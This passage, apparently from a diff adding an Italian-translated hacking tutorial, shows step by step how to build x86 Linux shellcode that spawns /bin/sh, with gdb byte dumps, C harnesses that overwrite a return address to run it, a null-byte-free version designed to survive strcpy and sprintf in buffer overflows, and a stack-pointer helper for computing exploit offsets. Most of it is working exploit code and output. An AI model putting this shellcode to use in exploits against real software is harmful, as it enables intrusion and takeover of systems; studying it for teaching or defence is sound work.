+(gdb) 
+0x804875b <main+43>:    0x6e 
+(gdb) 
+0x804875c <main+44>:    0x2f 
+(gdb) 
+0x804875d <main+45>:    0x73 
+(gdb) 
+0x804875e <main+46>:    0x68  <--------- c0de ends here 
+(gdb)quit 
+
+Ora scriviamo il nostro shell code->
+
+--------------- shell2.cpp ------------------ 
+char c0de[]= 
+"\xeb\x1e\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00" 
+"\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb8\x0b\x00\x00\x00" 
+"\xcd\x80\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"; 
+ 
+int main(){ 
+ char buf[5]; 
+ long *ret=(long *)(buf+12); 
+ *ret=(long)c0de; 
+} 
+--------------- Fine ------------------ 
+root@scorpion#cc shell2.cpp -o shell2 
+root@scorpion#./shell2 
+sh-2.03 
+
+Questo funziona...
+Scrivere "\x2f\x62\x69\x6e\x2f\x73\x68" e' la stessa cosa di scrivere "/bin/sh"
+Date uno sguardo al questo sorgente... C'e' \x00 o '\0' in alcuni posti.
+Come sappiamo bene, '\0' indica la fine di una stringa.
+strcpy ed altre funzioni sulle stringhe, copieranno la stringa data fino al 
+'\0' . Cosi il nostro codice non verrebbe copiato del tutto.
+Liberiamoci di questi '\0'
+
+Cambia questo             in questo
+----------------------------------------------------- 
+                         xorl %eax,%eax (bisogna aggiungere questo) 
+movb $0x0,0x7(%esi)      movb %al,0x7(%esi) 
+movl $0x0,0xc(%esi)      movl %eax,0xc(%esi) 
+movl $0xb,$eax           movb %0xb,%al 
+----------------------------------------------------- 
+
+riscriviamo il codice con questi cambiamenti ed otterremo cio'
+
+--------------- shell3.cpp --------------- 
+void main(){ 
+__asm__("jmp 0x18 \n" 
+        "popl %esi \n" 
+        "movl %esi,0x8(%esi) \n" 
+        "xorl %eax,%eax \n" 
+        "movb %al,0x7(%esi) \n" 
+        "movl %eax,0xc(%esi) \n" 
+        "movl %esi,%ebx \n" 
+        "leal 0x8(%esi),%ecx \n" 
+        "leal 0xc(%esi),%edx \n" 
+        "movb $0xb,%al \n" 
+        "int $0x80 \n" 
+        "call -0x1d \n" 
+        ".string \"/bin/sh\" \n"); 
+} 
+--------------- Fine --------------- 
+
+compiliamo
+
+root@scorpion#cc shell3.cpp -o shell3 
+root@scorpion#gdb shell3 
+GNU gdb 4.18 
+Copyright 1998 Free Software Foundation, Inc. 
+GDB is free software, covered by the GNU General Public License, and you are 
+welcome to change it and/or distribute copies of it under certain conditions. 
+Type "show copying" to see the conditions. 
+There is absolutely no warranty for GDB.  Type "show warranty" for details. 
+This GDB was configured as "i686-pc-linux-gnu"... 
+(gdb) x/bx main+3                  <---------jmp parte qui
+0x80483c3 <main+3>:     0xeb 
+(gdb) 
+0x80483c4 <main+4>:     0x18 
+(gdb) 
+0x80483c5 <main+5>:     0x5e 
+(gdb) 
+0x80483c6 <main+6>:     0x89 
+(gdb) 
+0x80483c7 <main+7>:     0x76 
+(gdb) 
+0x80483c8 <main+8>:     0x08 
+(gdb) 
+0x80483c9 <main+9>:     0x31 
+(gdb) 
+0x80483ca <main+10>:    0xc0 
+(gdb) 
+0x80483cb <main+11>:    0x88 
+(gdb) 
+0x80483cc <main+12>:    0x46 
+(gdb) 
+0x80483cd <main+13>:    0x07 
+(gdb) 
+0x80483ce <main+14>:    0x89 
+(gdb) 
+0x80483cf <main+15>:    0x46 
+(gdb) 
+0x80483d0 <main+16>:    0x0c 
+(gdb) 
+0x80483d1 <main+17>:    0x89 
+(gdb) 
+0x80483d2 <main+18>:    0xf3 
+(gdb) 
+0x80483d3 <main+19>:    0x8d 
+(gdb) 
+0x80483d4 <main+20>:    0x4e 
+(gdb) 
+0x80483d5 <main+21>:    0x08 
+(gdb) 
+0x80483d6 <main+22>:    0x8d 
+(gdb) 
+0x80483d7 <main+23>:    0x56 
+(gdb) 
+0x80483d8 <main+24>:    0x0c 
+(gdb) 
+0x80483d9 <main+25>:    0xb0 
+(gdb) 
+0x80483da <main+26>:    0x0b 
+(gdb) 
+0x80483db <main+27>:    0xcd 
+(gdb) 
+0x80483dc <main+28>:    0x80 
+(gdb) 
+0x80483dd <main+29>:    0xe8 
+(gdb) 
+0x80483de <main+30>:    0xe3 
+(gdb) 
+0x80483df <main+31>:    0xff 
+(gdb) 
+0x80483e0 <main+32>:    0xff 
+(gdb) 
+0x80483e1 <main+33>:    0xff 
+(gdb) 
+0x80483e2 <main+34>:    0x2f 
+(gdb) 
+0x80483e3 <main+35>:    0x62 
+(gdb) 
+0x80483e4 <main+36>:    0x69 
+(gdb) 
+0x80483e5 <main+37>:    0x6e 
+(gdb) 
+0x80483e6 <main+38>:    0x2f 
+(gdb) 
+0x80483e7 <main+39>:    0x73 
+(gdb) 
+0x80483e8 <main+40>:    0x68       <--------- fine del codice
+(gdb)quit
+
+riscriviamo il programma:
+
+-------------- shell4.cpp ---------------- 
+char c0de[]= 
+"\xeb\x18\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3" 
+"\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff\x2f" 
+"\x62\x69\x6e\x2f\x73\x68"; 
+ 
+void main(){ 
+ char buf[5]; 
+ long *ret=(long *)(buf+12); 
+ *ret=(long)c0de; 
+} 
+-------------- Fine ---------------- 
+compile  shell4.cpp 
+root@scorpion#cc shell4.cpp -o shell4 
+root@scorpion#./shell4 
+sh-2.03# 
+
+Funziona... ed e' piu' piccolo del codice precedente e senza 0x00 oppure 
+\x00 o '\0' percio' strcpy(), sprintf() lo copieranno tutto...
+
+Eccovi un semplice programma per stampare il puntatore allo stack di questo 
+programma:
+
+------- sp.cpp ----------- 
+unsigned long get_esp(){ 
+ __asm__(" movl %esp,%eax \n"); 
+} 
+ 
+void main(){ 
+ printf(" Stack pointer is 0x%x%\n",get_esp()); 
+} 
+------- Fine ----------- 
+root@scorpion#cc sp.cpp -o sp 
+root@scoprion#./sp 
+ Il puntatore allo stack e' 0xbffff910  <--- il vostro output potrebbe essere
+differente
+root@scorpion# 
+ 
+  Questo testo e' stato scritto usando vi e joe come text editors
+
+-EOF-
+
+##############################################################################################
+Questo tutorial e' stato tradotto da N'eM Sy (nemesy.it@tiscalinet.it). Per la
+traduzione mi 
+sono attenuto per quanto era possibile all'originale. Per qualsiasi problema,
+informazione e 
+per ottenere la versione originale del testo andate su
+<http://napolihak.cjb.net>.
+
+                 *      N      *
+                  °           °
+                   °    '    °
+                    \       /
+                     \  e  /
+                      \   /
+              N  '  e   M   S   y
+                      /   \
+                     /  S  \
+                    /       \
+                   °    y    °
+                  °           °
+                 *             *
